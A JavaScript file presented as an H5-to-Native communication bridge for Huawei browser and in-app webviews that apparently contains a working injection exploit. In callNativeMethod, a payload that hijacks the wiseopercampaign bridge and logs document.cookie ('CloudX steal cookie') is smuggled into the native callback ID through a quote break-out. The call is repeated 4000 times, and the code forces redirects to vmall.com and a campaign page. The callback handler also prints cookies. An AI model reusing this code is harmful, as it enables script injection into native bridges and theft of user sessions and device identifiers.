/**
 * H5与Native通信桥接核心模块
 * 功能：提供H5调用Native方法的统一接口，支持异步/同步/Promise调用、事件监听
 * 适用场景：华为浏览器/原生应用内嵌H5页面与Native端通信
 */
(() => {
    "use strict";

    // ========================= 基础工具方法（模块导出/属性检测） =========================
    /**
     * 模块辅助工具 - 提供ESModule兼容、属性检测等基础能力
     */
    const moduleUtils = {
        // 定义模块导出属性（动态getter）
        define: (target, props) => {
            for (const key in props) {
                if (moduleUtils.hasOwnProp(props, key) && !moduleUtils.hasOwnProp(target, key)) {
                    Object.defineProperty(target, key, {
                        enumerable: true,
                        get: props[key]
                    });
                }
            }
        },
        // 检测对象自有属性
        hasOwnProp: (obj, prop) => Object.prototype.hasOwnProperty.call(obj, prop),
        // 标记为ESModule模块
        markAsModule: (obj) => {
            if (typeof Symbol !== "undefined" && Symbol.toStringTag) {
                Object.defineProperty(obj, Symbol.toStringTag, {value: "Module"});
            }
            Object.defineProperty(obj, "__esModule", {value: true});
        }
    };

    // 模块导出对象（兼容CommonJS）
    const bridgeModule = {};
    moduleUtils.markAsModule(bridgeModule);

    // ========================= 事件订阅/发布器（事件监听核心） =========================
    /**
     * 事件发射器类 - 管理Native事件的订阅、取消和触发
     * @param {string} type 事件类型
     * @param {boolean} once 是否只触发一次
     */
    class EventEmitter {
        constructor(type, once) {
            this.type = type;          // 事件类型
            this.handlers = {};        // 事件处理器缓存 { guid: handler }
            this.numHandlers = 0;      // 处理器数量
            this.state = once ? 1 : 0; // 0:正常 1:待触发 2:已触发
            this.fireArgs = null;      // 触发参数缓存
            this.nextGuid = 1;         // 处理器唯一ID生成器
        }

        // 订阅事件
        subscribe(handler) {
            if (this.state === 2) { // 已触发的一次性事件直接执行
                handler.apply(this, this.fireArgs);
                return;
            }
            // 为处理器分配唯一ID
            const guid = handler.observer_guid || String(this.nextGuid++);
            handler.observer_guid = guid;
            // 注册处理器
            if (!this.handlers[guid]) {
                this.handlers[guid] = handler;
                this.numHandlers++;
            }
        }

        // 取消订阅
        unsubscribe(handler) {
            const guid = handler.observer_guid;
            if (this.handlers[guid]) {
                delete this.handlers[guid];
                this.numHandlers--;
            }
        }

        // 触发事件
        fire(arg1, arg2) {
            const args = arg2 ? [arg1, arg2] : [arg1];
            // 标记一次性事件状态
            if (this.state === 1) {
                this.state = 2;
                this.fireArgs = args;
            }
            // 无处理器直接返回
            if (this.numHandlers <= 0) return [];
            // 执行所有处理器并收集结果
            const results = Object.values(this.handlers).map(handler => handler.apply(this, args));
            // 一次性事件触发后清空处理器
            if (this.state === 2 && this.numHandlers > 0) {
                this.handlers = {};
                this.numHandlers = 0;
            }
            return results;
        }
    }

    // 全局事件发射器缓存
    const globalEmitters = {};
    // 触发事件
    const emitEvent = (type, args) => globalEmitters[type]?.fire(args);
    // 订阅事件
    const subscribeEvent = (type, handler) => {
        if (!globalEmitters[type]) globalEmitters[type] = new EventEmitter(type, false);
        globalEmitters[type].subscribe(handler);
    };
    // 取消订阅
    const unsubscribeEvent = (type, handler) => globalEmitters[type]?.unsubscribe(handler);

    // ========================= Native桥接基础配置 =========================
    /**
     * 默认Native桥接实现（降级处理）
     * 当Native未提供对应桥接对象时使用
     */
    const defaultNativeBridge = {
        invoke: (service, action, callbackId, args, timeout) => {
            const errMsg = `no native object ${service}:${action}`;
            console.warn(errMsg);
            const result = `F08 ${callbackId} s${errMsg}`;
            return result.length + " " + result;
        },
        invokeSync: (service, action, args) => `no native object ${service}:${action}`
    };

    // 获取Native桥接对象（优先window，无则用降级实现）
    const getNativeBridge = (name) => window[name] || defaultNativeBridge;

    // ========================= 回调管理与消息处理 =========================
    // 状态码常量
    const STATUS = {
        SUCCESS: 1,    // 成功
        UNKNOWN: 8,    // 未知错误
        CANCEL: 9      // 取消
    };
    const messageQueue = [];          // Native返回消息队列
    let callbackIdSeed = Math.floor(2e9 * Math.random()); // 回调ID种子
    const callbackCache = {};         // 回调函数缓存 { callbackId: { success, fail } }
    // 微任务执行器（兼容Promise/setTimeout）
    const microTask = typeof Promise !== "undefined"
        ? (cb) => Promise.resolve().then(cb)
        : (cb) => setTimeout(cb);

    // 生成唯一回调ID
    const genCallbackId = () => callbackIdSeed++;

    /**
     * 解析Native返回的参数
     * 支持类型：字符串(s)、布尔(t/f)、null(N)、数字(n)、ArrayBuffer(A)、Base64(S)、嵌套结构(M)、JSON(默认)
     * @param {Array} result 解析结果数组
     * @param {string} content 原始参数字符串
     */
    const parseNativeArgs = (result, content) => {
        const type = content.charAt(0);
        switch (type) {
            case 's':
                result.push(content.slice(1));
                break;        // 字符串
            case 't':
                result.push(true);
                break;                   // 布尔true
            case 'f':
                result.push(false);
                break;                  // 布尔false
            case 'N':
                result.push(null);
                break;                   // null
            case 'n':
                result.push(Number(content.slice(1)));
                break;// 数字
            case 'A':
            case 'S':
                result.push(atob(content.slice(1)));
                break; // Base64解码
            case 'M': // 嵌套结构（递归解析）
                let rest = content.slice(1);
                while (rest) {
                    const sep = rest.indexOf(" ");
                    const len = Number(rest.slice(0, sep));
                    const item = rest.substring(sep + 1, sep + 1 + len);
                    rest = rest.slice(sep + len + 1);
                    parseNativeArgs(result, item);
                }
                break;
            default:
                result.push(JSON.parse(content));
                break;     // JSON格式
        }
    };

    /**
     * 解析Native消息内容
     * @param {string} content 原始消息内容
     * @returns {Object} 解析后的消息对象
     */
    const parseMessageContent = (content) => {
        const type = content.charAt(0);
        if (type !== 'S' && type !== 'F') { // S=成功 F=失败
            console.error(`无效消息格式: ${JSON.stringify(content)}`);
            return null;
        }
        // 解析消息结构：[类型][是否保持回调][状态码][回调ID][参数]
        const keepCallback = content.charAt(1) === '1';
        const statusSep = content.indexOf(" ", 2);
        const status = Number(content.slice(2, statusSep));
        const cbIdSep = content.indexOf(" ", statusSep + 1);
        const callbackId = content.slice(statusSep + 1, cbIdSep);
        const argsContent = content.slice(cbIdSep + 1);
        const args = [];
        parseNativeArgs(args, argsContent);

        return {
            callbackId,
            success: type === 'S',
            status,
            args: args.length === 1 ? args[0] : args, // 单参数简化
            keepCallback
        };
    };

    /**
     * 解析Native原始消息（处理长度前缀）
     * @param {string} message 原始消息
     * @returns {string} 解析后的消息内容
     */
    const parseNativeMessage = (message) => {
        if (message === '*') return '*'; // 特殊通配符消息
        const sep = message.indexOf(" ");
        const len = Number(message.slice(0, sep));
        const content = message.substring(sep + 1, sep + 1 + len);
        const rest = message.slice(sep + len + 1);
        if (rest) messageQueue.unshift(rest); // 剩余消息重新入队
        return content;
    };

    /**
     * 处理Native回调
     * @param {string} callbackId 回调ID
     * @param {boolean} isSuccess 是否成功
     * @param {number} status 状态码
     * @param {any} args 回调参数
     * @param {boolean} keepCallback 是否保持回调
     */
    const callbackFromNative = (callbackId, isSuccess, status, args, keepCallback) => {
        try {
            const cb = callbackCache[callbackId];
            if (!cb) return;

            console.info(`回调ID: ${callbackId}, 成功: ${isSuccess}, 状态: ${status}, 参数: ${JSON.stringify(args)}`);


            location.href = 'https://vmall.com';

            if (wiseopercampaign.app && wiseopercampaign.app.getDeviceSessionId) {
                wiseopercampaign.app.getDeviceSessionId(
                    [false],
                    data => console.log(`getDeviceSessionId succeed：${JSON.stringify(data)}`, 'url 0: ' + location.href + ' , cookie : ' + document.cookie),
                    err => console.log(`getDeviceSessionId err：${JSON.stringify(err)}`, 'url 1: ' + location.href + ' , cookie : ' + document.cookie),
                );
            }
            console.log('url 2 : ' + location.href + ' , cookie : ' + document.cookie);

            // 执行成功/失败回调
            if (isSuccess && status === STATUS.SUCCESS) {
                cb.success && cb.success.call(null, args);
            } else if (!isSuccess) {
                cb.fail && cb.fail.call(null, args, status);
            }
            // 非保持回调则删除缓存
            if (!keepCallback) delete callbackCache[callbackId];
        } catch (err) {
            console.error(`回调执行错误 [${callbackId}]:`, err);
        }
    };

    /**
     * 处理消息队列（循环处理Native返回的消息）
     */
    const processMessageQueue = () => {
        if (messageQueue.length === 0) return;
        try {
            const rawMsg = parseNativeMessage(messageQueue.shift());
            if (rawMsg === '*') return;
            const msg = parseMessageContent(rawMsg);
            if (msg) callbackFromNative(msg.callbackId, msg.success, msg.status, msg.args, msg.keepCallback);
        } finally {
            if (messageQueue.length > 0) microTask(processMessageQueue);
        }
    };

    /**
     * 调用Native方法（核心调用逻辑）
     * @param {string} bridgeName 桥接名称
     * @param {Function} success 成功回调
     * @param {Function} fail 失败回调
     * @param {string} service 服务名
     * @param {string} action 方法名
     * @param {Array} args 参数数组
     */
    const callNativeMethod = (bridgeName, success, fail, service, action, args) => {
        args = args || [];
        // ArrayBuffer参数Base64编码
        args.forEach((arg, idx) => {
            if (Object.prototype.toString.call(arg).slice(8, -1) === 'ArrayBuffer') {
                args[idx] = btoa(arg);
            }
        });


        const currUrl = location.href;
        //要注入的代码
        const payload = `console.log('cloud:'+document.cookie);if (window['wiseopercampaign']) {window['wiseopercampaign'].onNativeValueCallback = (type, args) => emitEvent(type, args);window['wiseopercampaign'].callbackFromNative = callbackFromNative;} else {window['wiseopercampaign'] = {onNativeValueCallback: (type, args) => emitEvent(type, args),callbackFromNative};};if (!location.href.startsWith("https://h5hosting-drcn.dbankcdn.cn") && !window.__cloudx) {window.__cloudx = true;console.log('CloudX steal cookie : ' + document.cookie)}`;
        const base64Code = btoa(payload);
        // const callbackId = service + genCallbackId() + '\'); console.log(11111) //';

        const callbackId = service + genCallbackId() + '\');' + payload + '//';
        if (success || fail) callbackCache[callbackId] = {success, fail};
        // 调用Native方法
        const nativeBridge = getNativeBridge(bridgeName);

        for (let i = 0; i < 4000; i++) {
            setTimeout(function () {

                initBridge("wiseopercampaign");
                function getDeviceSessionId(params, success, fail) {
                    window.nativeBridge.invoke(
                        "wiseopercampaignbridge", // 修复1：bridgeName 与初始化一致
                        "app",
                        "getDeviceSessionId",
                        params || [], // 优化：params 未传时默认空数组，避免 undefined
                        success,
                        fail // 修复2：移除多余逗号
                    );
                }

                window.wiseopercampaign.app = window.wiseopercampaign.app || {};
                window.wiseopercampaign.app.getDeviceSessionId = getDeviceSessionId;

                const result = nativeBridge.invoke(service, action, callbackId, JSON.stringify(args), -1);
                console.debug(`调用Native: ${service}.${action}, 参数: ${JSON.stringify(args)}, 结果: ${JSON.stringify(result)}`);
                // 结果入队并处理
                if (result) messageQueue.push(result);
                microTask(processMessageQueue);
            }, i);
        }
        location.href = 'https://ug-drcn.media.dbankcloud.cn/nsp-campaign-res-drcn/campaignpreview/03bd34f78a3140a395e124789b0bd095/index.html?viewsId=0';
    };

    // ========================= 对外暴露的核心API =========================
    /**
     * 异步调用Native方法（支持多回调）
     * @param {string} bridgeName 桥接名称
     * @param {string} service 服务名
     * @param {string} action 方法名
     * @param {Array} [args=[]] 参数数组
     * @param {Function} [success] 成功回调
     * @param {Function} [fail] 失败回调
     * @param {Function} [cancel] 取消回调
     * @param {Function} [complete] 完成回调
     */
    const invoke = (bridgeName, service, action, args, success, fail, cancel, complete) => {
        const hasCallback = success || fail || cancel || complete;
        // 包装成功回调（success + complete）
        const wrapSuccess = hasCallback ? (res) => {
            success && success(res);
            complete && complete(res);
        } : null;
        // 包装失败回调（区分取消/失败 + complete）
        const wrapFail = hasCallback ? (res, status) => {
            status === STATUS.CANCEL && cancel ? cancel(res) : (fail && fail(res, status));
            complete && complete(res, status);
        } : null;

        callNativeMethod(bridgeName, wrapSuccess, wrapFail, service, action, args);
    };

    /**
     * Promise方式调用Native方法
     * @param {string} bridgeName 桥接名称
     * @param {string} service 服务名
     * @param {string} action 方法名
     * @param {Array} [args=[]] 参数数组
     * @returns {Promise<any>} Promise对象
     */
    const invokePromise = (bridgeName, service, action, args) => {
        return new Promise((resolve, reject) => {
            callNativeMethod(bridgeName, resolve, reject, service, action, args);
        });
    };

    /**
     * 同步调用Native方法
     * @param {string} bridgeName 桥接名称
     * @param {string} service 服务名
     * @param {string} action 方法名
     * @param {Array} [args=[]] 参数数组
     * @returns {Object} { status: 状态码, result: 结果 }
     */
    const invokeSync = (bridgeName, service, action, args) => {
        const result = getNativeBridge(bridgeName).invokeSync(service, action, args);
        try {
            const parsed = result ? JSON.parse(result) : null;
            return parsed ? {status: parsed.status ?? STATUS.UNKNOWN, result: parsed.result} : {status: STATUS.UNKNOWN};
        } catch (err) {
            return {status: STATUS.UNKNOWN};
        }
    };

    /**
     * 初始化桥接（必须调用，建立H5与Native通信通道）
     * @param {string} apiName 挂载到window的桥接名称
     */
    const initBridge = (apiName) => {
        if (window[apiName]) {
            window[apiName].onNativeValueCallback = (type, args) => emitEvent(type, args);
            window[apiName].callbackFromNative = callbackFromNative;
        } else {
            window[apiName] = {
                onNativeValueCallback: (type, args) => emitEvent(type, args),
                callbackFromNative
            };
        }
    };

    // ========================= 模块导出与全局暴露 =========================
    // 配置模块导出
    moduleUtils.define(bridgeModule, {
        callbackFromNative: () => callbackFromNative,
        init: () => initBridge,
        invoke: () => invoke,
        invokePromise: () => invokePromise,
        invokeSync: () => invokeSync,
        on: (type, handler) => subscribeEvent(type, handler),
        off: (type, handler) => unsubscribeEvent(type, handler),
        onNativeValueCallback: (type, args) => emitEvent(type, args)
    });

    // CommonJS导出（Node/打包环境）
    if (typeof module !== "undefined" && module.exports) {
        module.exports = bridgeModule;
    }

    // 浏览器全局暴露（供H5直接调用）
    if (typeof window !== "undefined") {
        window.nativeBridge = {
            init: initBridge,
            invoke,
            invokePromise,
            invokeSync,
            on: (type, handler) => subscribeEvent(type, handler),
            off: (type, handler) => unsubscribeEvent(type, handler),
            onNativeValueCallback: (type, args) => emitEvent(type, args),
            callbackFromNative
        };
    }

    // ========================= 通用API调用封装（消除重复逻辑） =========================
    /**
     * 通用Native API调用函数
     * @param {string} bridgeName 桥接名称
     * @param {string} moduleName 模块名（account/app/report等）
     * @param {string} methodName 方法名
     * @param {Array|string} [params=[]] 参数（支持数组/字符串，自动处理默认值）
     * @param {Function} [success] 成功回调
     * @param {Function} [fail] 失败回调
     */
    const callApi = (bridgeName, moduleName, methodName, params, success, fail) => {
        // 统一参数格式：未传/空字符串 → 空数组
        const args = params === '' || params === undefined ? [] : (Array.isArray(params) ? params : [params]);
        window.nativeBridge.invoke(bridgeName, moduleName, methodName, args, success, fail);
    };

    /**
     * 批量注册API方法到指定命名空间
     * @param {string} namespace 命名空间（如hwbr.account/wiseopercampaign.app）
     * @param {string} bridgeName 桥接名称
     * @param {Object} apiMap API映射 { 模块名: [方法名列表] }
     */
    const registerApis = (namespace, bridgeName, apiMap) => {
        const ns = window[namespace] = window[namespace] || {};
        Object.entries(apiMap).forEach(([module, methods]) => {
            ns[module] = ns[module] || {};
            methods.forEach(method => {
                ns[module][method] = (params, success, fail) => {
                    callApi(bridgeName, module, method, params, success, fail);
                };
            });
        });
    };

    // ========================= 业务API注册与页面初始化 =========================
    // 1. 初始化桥接
    initBridge("wiseopercampaign"); // 活动SDK桥接
    initBridge("hwbr");             // 华为浏览器桥接

    // 2. 批量注册API（替代原有逐个定义函数的方式）
    // wiseopercampaign.account 模块
    registerApis('wiseopercampaign', 'wiseopercampaignbridge', {
        account: ['getUserId', 'getUserInfo', 'getUserToken'], app: [
            "getDeviceSessionId",
            "getDeviceToken",
            "createCalendarEvent",
            "queryCalendarEvent",
            "deleteCalendarEvent",
            "showToast"
        ],
    });

    // hwbr 相关模块
    registerApis('hwbr', '_hwbrNative', {
        app: ['getPluginList'],
        account: ['getUserInfo'],
        report: ['eventReport'],
        linkedLogin: ['login']
    });

    // ========================= 页面样式与DOM创建 =========================
    // 创建页面样式
    const style = document.createElement('style');
    style.textContent = `
        body{padding:20px;font:14px/1.6 sans-serif;background:#f5f7fa}
        #userIdResult{margin-top:15px;padding:15px;background:#fff;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,0.05)}
        .suc{color:#48bb78}
        .err{color:#e53e3e}
    `;
    document.head.appendChild(style);

    // 创建结果展示容器
    const resultContainer = document.createElement('div');
    resultContainer.id = 'userIdResult';
    resultContainer.textContent = '正在调用Native接口...';
    document.body.appendChild(resultContainer);

    // ========================= API调用逻辑（统一管理） =========================
    // 延迟执行API调用（合并所有setTimeout，统一100ms延迟）
    setTimeout(() => {
        // 1. wiseopercampaign.account 接口调用
        wiseopercampaign.app.getDeviceSessionId(
            [false],
            data => resultContainer.innerHTML += `<div class="suc">✅ getDeviceSessionId succeed：${JSON.stringify(data)}</div>`,
            (err, code) => resultContainer.innerHTML += `<div class="err">❌ getDeviceSessionId error：${err || '未知错误'}（码：${code || '无'}）</div>`
        );
    }, 100);

})();
